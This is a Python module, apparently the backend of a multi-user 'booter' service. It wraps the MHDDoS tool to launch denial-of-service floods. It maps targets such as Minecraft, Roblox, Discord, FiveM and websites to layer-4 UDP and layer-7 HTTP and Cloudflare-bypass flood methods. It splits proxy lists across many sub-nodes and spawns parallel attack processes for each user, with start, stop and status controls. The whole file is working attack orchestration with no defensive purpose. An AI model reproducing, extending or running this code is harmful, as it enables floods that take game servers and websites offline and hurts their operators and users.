# mhddos_engine.py
import asyncio
import os
import sys
from config import (
    MHDDOS_FULL, MHDDOS_DIR,
    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE, RPC_PER_SUB_NODE,
    proxy_slice_file,
)

MODULE_MAP = {
    "minecraft":  ("L4", "MCBOT",  {}),
    "roblox":     ("L4", "UDP",    {}),
    "discord":    ("L4", "UDP",    {}),
    "fivem":      ("L4", "FIVEM",  {}),
    "web":        ("L7", "CFB",    {}),
    "web_bypass": ("L7", "BYPASS", {}),
    "web_stress": ("L7", "STRESS", {}),
    "http_flood": ("L7", "GET",    {}),
}

L4_MODULES = {"minecraft", "roblox", "discord", "fivem"}


class MHDDoSEngine:
    def __init__(self):
        # user_id → list of (process, slice_file_path)
        self.running: dict[int, list] = {}

    # ── command builder ──
    def _build_cmd(self, method: str, layer: str, target: str, port: int,
                   duration: int, threads: int,
                   proxies_path: str, rpc: int) -> list[str]:
        if layer == "L7":
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_FULL,
                method, host, "5",
                str(threads), proxies_path, str(rpc), str(duration),
            ]
        else:
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_FULL,
                method, host, str(threads), str(duration),
            ]

    # ── start ──
    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int,
                    proxy_slices: list[list[str]]):
        """
        proxy_slices: list ของ list — 1 slice ต่อ 1 sub-node
                      len = devices * SUB_NODES_PER_DEVICE
        """
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        info = MODULE_MAP.get(module)
        if not info:
            raise ValueError(f"unknown module: {module}")
        layer, method, _ = info

        sub_nodes = devices * SUB_NODES_PER_DEVICE

        # เตรียม slice file ทุก sub-node
        for i in range(sub_nodes):
            data = proxy_slices[i] if i < len(proxy_slices) else []
            path = proxy_slice_file(user_id, i)
            with open(path, "w") as f:
                f.write("\n".join(data))

        # spawn process ทุก sub-node พร้อมกัน
        procs = []
        for i in range(sub_nodes):
            path = proxy_slice_file(user_id, i)
            cmd = self._build_cmd(
                method, layer, target, port, duration,
                THREADS_PER_SUB_NODE, path, RPC_PER_SUB_NODE,
            )
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
                cwd=MHDDOS_DIR,
            )
            procs.append((proc, path))
            await asyncio.sleep(0.05)  # ยิงห่างกันนิด กัน OS choke

        self.running[user_id] = procs
        return procs

    # ── stop ──
    async def stop(self, user_id: int):
        procs = self.running.pop(user_id, [])
        if not procs:
            return
        # terminate ทั้งหมด
        for proc, _ in procs:
            if proc.returncode is None:
                try:
                    proc.terminate()
                except Exception:
                    pass
        # รอ + kill ถ้าไม่ตาย
        for proc, _ in procs:
            if proc.returncode is None:
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                except Exception:
                    pass
        # ลบ slice files
        for _, path in procs:
            try:
                os.remove(path)
            except OSError:
                pass

    # ── status ──
    def is_running(self, user_id: int) -> bool:
        procs = self.running.get(user_id, [])
        return any(p.returncode is None for p, _ in procs)

    def alive_count(self, user_id: int) -> tuple[int, int]:
        """คืน (alive, total)"""
        procs = self.running.get(user_id, [])
        alive = sum(1 for p, _ in procs if p.returncode is None)
        return alive, len(procs)

    async def shutdown_all(self):
        for uid in list(self.running.keys()):
            await self.stop(uid)